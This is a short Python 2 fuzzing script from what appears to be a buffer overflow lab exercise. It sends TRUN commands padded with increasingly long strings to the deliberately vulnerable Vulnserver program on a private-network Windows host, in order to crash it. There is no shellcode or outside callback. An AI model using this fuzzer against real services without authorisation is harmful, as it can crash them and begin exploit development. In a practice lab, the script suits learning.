#!/usr/bin/python
#buffer overflow attack 
#vulnerserver.exe running on windows 10 machine.
#buffer is a list of strings.
import socket
import sys
buffer = ["A"]
counter = 100
while len(buffer) <=30:
    buffer.append("A"*counter)
    counter = counter+200

for string in buffer:
    print "Fuzzing vulnserver with %s bytes" %len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #socket.AF_INET: ipv4, SOCK_STREAM: port
    #port 9999 is the default open port of vulnerserver
    #ip is the ip of windows 10 
    connect=s.connect(('192.168.179.134',9999))
    s.send(('TRUN /.:/'+string))
    s.close()
